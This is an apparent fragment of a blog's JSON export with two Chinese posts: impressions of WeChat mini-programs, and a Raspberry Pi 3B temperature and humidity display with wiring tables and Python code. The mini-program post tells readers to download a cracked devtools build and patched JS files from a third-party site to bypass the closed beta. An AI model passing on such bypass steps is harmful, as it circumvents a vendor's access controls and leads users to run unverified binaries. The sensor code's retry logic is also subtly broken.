尝鲜\n\n![](/content/images/wechat/1.jpg)\n\n![](/content/images/wechat/2.jpg)\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n* app.js\n* app.wxss\n* app.json\n* app.wxml\n\n其中wxss文件类似于css，所有css语法均支持\njs是APP()\njson文件是层级设置，页面的形态\nwxml文件更像是xml和html的混合版\n\n![](/content/images/wechat/3.jpg)\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n\n# 优点\n* **HTML5是未来，腾讯帮助整个生态系统往前走了一大步。**\n* 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n* 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n* 开发简单，入门门槛低。\n\n# 缺点\n* 不支持引用js，比如jquery等众多优秀的js插件。\n* 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n* 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n* 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n# 总结\n我想用一句名言总结一下前端趋势及未来App趋势：\n> Any application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","source":"_posts/微信小程序的一些感想.md","raw":"---\ntitle: 微信小程序的一些感想\ndate: 2016-09-25 18:50:00\ntags: Web\ncategories: Web\n---\n\n# 前言\n这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n\n# 下载\n微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。\nMac版下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\n\nwindows下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n\n# 破解\n如果你不是内测用户，你需要破解，先下载以下文件。\n\n文件1：\n\nhttp://source.lattecake.com/files/2016/09/createstep.js\n\n文件2：\n\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n\n替换路径：\n\ncreatestep.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\n\nprojectStores.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n\n# 尝鲜\n\n![](/content/images/wechat/1.jpg)\n\n![](/content/images/wechat/2.jpg)\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n* app.js\n* app.wxss\n* app.json\n* app.wxml\n\n其中wxss文件类似于css，所有css语法均支持\njs是APP()\njson文件是层级设置，页面的形态\nwxml文件更像是xml和html的混合版\n\n![](/content/images/wechat/3.jpg)\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n\n# 优点\n* **HTML5是未来，腾讯帮助整个生态系统往前走了一大步。**\n* 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n* 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n* 开发简单，入门门槛低。\n\n# 缺点\n* 不支持引用js，比如jquery等众多优秀的js插件。\n* 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n* 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n* 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n# 总结\n我想用一句名言总结一下前端趋势及未来App趋势：\n> Any application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","slug":"微信小程序的一些感想","published":1,"updated":"2016-09-25T19:24:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskah00103son400hidi2","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。</p>\n<h1 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>\n<p>windows下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>\n<h1 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>\n<p>文件1：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/createstep.js\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/createstep.js</a></p>\n<p>文件2：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/projectStores.js\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>\n<p>替换路径：</p>\n<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>\n<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>\n<h1 id=\"尝鲜\"><a href=\"#尝鲜\" class=\"headerlink\" title=\"尝鲜\"></a>尝鲜</h1><p><img src=\"/content/images/wechat/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/wechat/2.jpg\" alt=\"\"><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>\n<ul>\n<li>app.js</li>\n<li>app.wxss</li>\n<li>app.json</li>\n<li>app.wxml</li>\n</ul>\n<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>\n<p><img src=\"/content/images/wechat/3.jpg\" alt=\"\"></p>\n<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>\n<h1 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h1><ul>\n<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>\n<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>\n<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>\n<li>开发简单，入门门槛低。</li>\n</ul>\n<h1 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h1><ul>\n<li>不支持引用js，比如jquery等众多优秀的js插件。</li>\n<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>\n<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>\n<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>\n</blockquote>\n<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>\n<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>\n","excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。</p>\n<h1 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>\n<p>windows下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>\n<h1 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>\n<p>文件1：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/createstep.js\">http://source.lattecake.com/files/2016/09/createstep.js</a></p>\n<p>文件2：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/projectStores.js\">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>\n<p>替换路径：</p>\n<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>\n<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>\n<h1 id=\"尝鲜\"><a href=\"#尝鲜\" class=\"headerlink\" title=\"尝鲜\"></a>尝鲜</h1><p><img src=\"/content/images/wechat/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/wechat/2.jpg\" alt=\"\"><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>\n<ul>\n<li>app.js</li>\n<li>app.wxss</li>\n<li>app.json</li>\n<li>app.wxml</li>\n</ul>\n<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>\n<p><img src=\"/content/images/wechat/3.jpg\" alt=\"\"></p>\n<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>\n<h1 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h1><ul>\n<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>\n<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>\n<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>\n<li>开发简单，入门门槛低。</li>\n</ul>\n<h1 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h1><ul>\n<li>不支持引用js，比如jquery等众多优秀的js插件。</li>\n<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>\n<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>\n<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>\n</blockquote>\n<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>\n<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>\n"},{"title":"基于树莓派的实时温度湿度监测平台","id":"15","updated":"2016-08-25T18:28:59.000Z","date":"2016-08-25T12:39:08.000Z","_content":"\n\n# 前言\n很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n<!-- more --> \n# 知识储备\n* 数字电子技术基础\n* 微机原理与接口技术\n* python语言\n\n# 原料\n* 树莓派3B\n* DHT11\n* LCD1602\n* 2K电阻（也可以是电位器）\n* 子-母 和 母-母 杜邦线\n* 电气绝缘胶带\n* 剪刀\n* 一颗耐心和一颗细心\n\n# 语言\n* Python 2.7\n\n# 组件\n* python-dev\n* python-rpi.gpio\n如果不具备以上，请执行：\n```bash\nsudo apt-get update\nsudo apt-get install python-dev\nsudo apt-get install python-rpi.gpio\n```\n\n# 接线\n我们一共要完成两个任务：\n\n* 1.连接LCD1602\n* 2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n![](/content/images/2016/08/GPIO.png)\n##  2K 电阻如何连接到电路\n简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\n\n## LCD1602 接线方案\n\nLCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n![](/content/images/2016/08/LCD1602--.jpg)\n\n树莓派的USB端口朝下，电源线位置朝上方向摆放。\n右端一共有40个引脚，每个引脚的PIN位置如上。\n\nVSS，接地，RPi PIN 6\nVDD，接5V电源，PRi PIN 2\nVO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9\nRS，寄存器选择，接GPIO 14，RPi PIN 8\nRW，读写选择，接地，表示写模式，PRi PIN 6\nE，使能信号，接GPIO 15，RPi PIN 10\nD0，数据位0，4位工作模式下不用，不接\nD1，数据位1，4位工作模式下不用，不接\nD2，数据位2，4位工作模式下不用，不接\nD3，数据位3，4位工作模式下不用，不接\nD4，数据位4，接GPIO 17，RPi PIN 11\nD5，数据位5，接GPIO 18，RPi PIN 12\nD6，数据位6，接GPIO 27，RPi PIN 13\nD7，数据位7，接GPIO 22，RPi PIN 15\nA，液晶屏背光+，接5V，RPi PIN 4\nK，液晶屏背光-，接地，RPi PIN 39\n\n**连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。**\n\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\n\n## LCD1602 开机测试\n接通电源线，默认情况下，如果连接正确：\n\n* 肯定没有爆炸\n* 会出现如下图的效果，证明你已经接线成功了\n![](/content/images/2016/08/1.jpg)\n\n## DHT11 接线方案\n接线简单，主要是把数据传输到GPIO26上\n\nDHT11有3个脚，VCC，DATA，GND\nVCC 接 3.3V PIN 01\nDATA 接 GPIO26 PIN 37\nGND 接地  PIN 09\n\n#代码\n采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\n\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n```python\n#!/usr/bin/python\n\n# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527\n# rewrite by ivan\n\nfrom time import sleep\nfrom datetime import datetime\nfrom time import sleep\nimport commands,time\nimport RPi.GPIO as GPIO\n\ndef get_tmp():\n  channel = 37\n  data = []\n  j = 0\n\n  GPIO.setmode(GPIO.BOARD)\n\n  time.sleep(1)\n\n  GPIO.setup(channel, GPIO.OUT)\n  GPIO.output(channel, GPIO.LOW)\n  time.sleep(0.5)\n  GPIO.output(channel, GPIO.HIGH)\n  GPIO.setup(channel, GPIO.IN)\n\n  while GPIO.input(channel) == GPIO.LOW:\n    continue\n  while GPIO.input(channel) == GPIO.HIGH:\n    continue\n\n  while j < 40:\n    k = 0\n    while GPIO.input(channel) == GPIO.LOW:\n      continue\n    while GPIO.input(channel) == GPIO.HIGH:\n      k += 1\n      if k > 100:\n        break\n    if k < 8:\n      data.append(0)\n    else:\n      data.append(1)\n\n    j += 1\n\n  print \"sensor is working.\"\n  print data\n\n  humidity_bit = data[0:8]\n  humidity_point_bit = data[8:16]\n  temperature_bit = data[16:24]\n  temperature_point_bit = data[24:32]\n  check_bit = data[32:40]\n\n  humidity = 0\n  humidity_point = 0\n  temperature = 0\n  temperature_point = 0\n  check = 0\n\n  for i in range(8):\n    humidity += humidity_bit[i] * 2 ** (7-i)\n    humidity_point += humidity_point_bit[i] * 2 ** (7-i)\n    temperature += temperature_bit[i] * 2 ** (7-i)\n    temperature_point += temperature_point_bit[i] * 2 ** (7-i)\n    check += check_bit[i] * 2 ** (7-i)\n\n  tmp = humidity + humidity_point + temperature + temperature_point\n\n  if check == tmp:\n    return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%'\n  else:\n    get_tmp()\n\n  GPIO.cleanup()    \n\nclass Adafruit_CharLCD:\n\n    # commands\n    LCD_CLEARDISPLAY            = 0x01\n    LCD_RETURNHOME                  = 0x02\n    LCD_ENTRYMODESET            = 0x04\n    LCD_DISPLAYCONTROL          = 0x08\n    LCD_CURSORSHIFT             = 0x10\n    LCD_FUNCTIONSET             = 0x20\n    LCD_SETCGRAMADDR            = 0x40\n    LCD_SETDDRAMADDR            = 0x80\n\n    # flags for display entry mode\n    LCD_ENTRYRIGHT              = 0x00\n    LCD_ENTRYLEFT               = 0x02\n    LCD_ENTRYSHIFTINCREMENT     = 0x01\n    LCD_ENTRYSHIFTDECREMENT     = 0x00\n\n    # flags for display on/off control\n    LCD_DISPLAYON               = 0x04\n    LCD_DISPLAYOFF              = 0x00\n    LCD_CURSORON                = 0x02\n    LCD_CURSOROFF               = 0x00\n    LCD_BLINKON                 = 0x01\n    LCD_BLINKOFF                = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n    LCD_MOVERIGHT               = 0x04\n    LCD_MOVELEFT                = 0x00\n\n    # flags for function set\n    LCD_8BITMODE                = 0x10\n    LCD_4BITMODE                = 0x00\n    LCD_2LINE                   = 0x08\n    LCD_1LINE                   = 0x00\n    LCD_5x10DOTS                = 0x04\n    LCD_5x8DOTS                 = 0x00\n\n\n\n    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):\n        # Emulate the old behavior of using RPi.GPIO if we haven't been given\n        # an explicit GPIO interface to use\n        if not GPIO:\n            import RPi.GPIO as GPIO\n        GPIO.setwarnings(False)\n\n        self.GPIO = GPIO\n        self.pin_rs = pin_rs\n        self.pin_e = pin_e\n        self.pins_db = pins_db\n\n        self.GPIO.setmode(GPIO.BOARD)\n        self.GPIO.setup(self.pin_e, GPIO.OUT)\n        self.GPIO.setup(self.pin_rs, GPIO.OUT)\n\n        for pin in self.pins_db:\n            self.GPIO.setup(pin, GPIO.OUT)\n\n        self.write4bits(0x33) # initialization\n        self.write4bits(0x32) # initialization\n        self.write4bits(0x28) # 2 line 5x7 matrix\n        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor\n        self.write4bits(0x06) # shift cursor right\n\n        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF\n\n        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS\n        self.displayfunction |= self.LCD_2LINE\n\n        \"\"\" Initialize to default text direction (for romance languages) \"\"\"\n        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode\n\n        self.clear()\n\n\n    def begin(self, cols, lines):\n\n        if (lines > 1):\n                self.numlines = lines\n                self.displayfunction |= self.LCD_2LINE\n                self.currline = 0\n\n\n    def home(self):\n\n        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero\n        self.delayMicroseconds(3000) # this command takes a long time!\n\n\n    def clear(self):\n\n        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display\n        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time\n\n\n    def setCursor(self, col, row):\n\n        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]\n\n        if ( row > self.numlines ): \n                row = self.numlines - 1 # we count rows starting w/0\n\n        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))\n\n\n    def noDisplay(self): \n        \"\"\" Turn the display off (quickly) \"\"\"\n\n        self.displaycontrol &= ~self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def display(self):\n        \"\"\" Turn the display on (quickly) \"\"\"\n\n        self.displaycontrol |= self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noCursor(self):\n        \"\"\" Turns the underline cursor on/off \"\"\"\n\n        self.displaycontrol &= ~self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def cursor(self):\n        \"\"\" Cursor On \"\"\"\n\n        self.displaycontrol |= self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def DisplayLeft(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)\n\n\n    def scrollDisplayRight(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);\n\n\n    def leftToRight(self):\n        \"\"\" This is for text that flows Left to Right \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);\n\n\n    def rightToLeft(self):\n        \"\"\" This is for text that flows Right to Left \"\"\"\n        self.displaymode &= ~self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def autoscroll(self):\n        \"\"\" This will 'right justify' text from the cursor \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def noAutoscroll(self): \n        \"\"\" This will 'left justify' text from the cursor \"\"\"\n\n        self.displaymode &= ~self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def write4bits(self, bits, char_mode=False):\n        \"\"\" Send command to LCD \"\"\"\n\n        self.delayMicroseconds(1000) # 1000 microsecond sleep\n\n        bits=bin(bits)[2:].zfill(8)\n\n        self.GPIO.output(self.pin_rs, char_mode)\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i], True)\n\n        self.pulseEnable()\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4,8):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i-4], True)\n\n        self.pulseEnable()\n\n\n    def delayMicroseconds(self, microseconds):\n        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds\n        sleep(seconds)\n\n\n    def pulseEnable(self):\n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, True)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # commands need > 37us to settle\n\n\n    def message(self, text):\n        \"\"\" Send string to LCD. Newline wraps to second line\"\"\"\n\n        for char in text:\n            if char == '\\n':\n                self.write4bits(0xC0) # next line\n            else:\n                self.write4bits(ord(char),True)\n\nif __name__ == '__main__':\n\n    while True:\n        tmp = get_tmp() \n        if tmp:\n            lcd = Adafruit_CharLCD()\n            lcd.noBlink()\n            lcd.clear()\n            lcd.message(tmp)\n        sleep(5)\n\n```\n# 运行效果\n![](/content/images/2016/08/WechatIMG302.jpeg)\n\n\n![](/content/images/2016/08/WechatIMG293.jpeg)\n# 参考资料\nhttps://gist.github.com/hugozhu/6166527\nhttps://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\nhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\nhttp://blog.csdn.net/xukai871105/article/details/12684617\nhttps://www.oschina.net/question/1425530\\_140979\nhttp://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\nhttp://blog.csdn.net/netccy/article/details/48098455\nhttps://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\nhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\nhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\nhttp://blog.csdn.net/rocklee/article/details/50082777\nhttp://www.guokr.com/post/718305/\nhttp://www.rs-online.com/designspark/electronics/blog/content-1148\nhttp://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\nhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\nhttp://blog.csdn.net/u013431550/article/details/40870947\nhttp://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\nhttp://blog.csdn.net/longerzone/article/details/36171381","source":"_posts/基于树莓派的实时温度湿度监测平台.md","raw":"---\ntitle: 基于树莓派的实时温度湿度监测平台\ntags: 'Raspberry'\npermalink: rpi-tmp-hdt-platform\nid: 15\nupdated: '2016-08-25 19:28:59'\ndate: 2016-08-25 13:39:08\n---\n\n\n# 前言\n很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n<!-- more --> \n# 知识储备\n* 数字电子技术基础\n* 微机原理与接口技术\n* python语言\n\n# 原料\n* 树莓派3B\n* DHT11\n* LCD1602\n* 2K电阻（也可以是电位器）\n* 子-母 和 母-母 杜邦线\n* 电气绝缘胶带\n* 剪刀\n* 一颗耐心和一颗细心\n\n# 语言\n* Python 2.7\n\n# 组件\n* python-dev\n* python-rpi.gpio\n如果不具备以上，请执行：\n```bash\nsudo apt-get update\nsudo apt-get install python-dev\nsudo apt-get install python-rpi.gpio\n```\n\n# 接线\n我们一共要完成两个任务：\n\n* 1.连接LCD1602\n* 2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n![](/content/images/2016/08/GPIO.png)\n##  2K 电阻如何连接到电路\n简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\n\n## LCD1602 接线方案\n\nLCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n![](/content/images/2016/08/LCD1602--.jpg)\n\n树莓派的USB端口朝下，电源线位置朝上方向摆放。\n右端一共有40个引脚，每个引脚的PIN位置如上。\n\nVSS，接地，RPi PIN 6\nVDD，接5V电源，PRi PIN 2\nVO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9\nRS，寄存器选择，接GPIO 14，RPi PIN 8\nRW，读写选择，接地，表示写模式，PRi PIN 6\nE，使能信号，接GPIO 15，RPi PIN 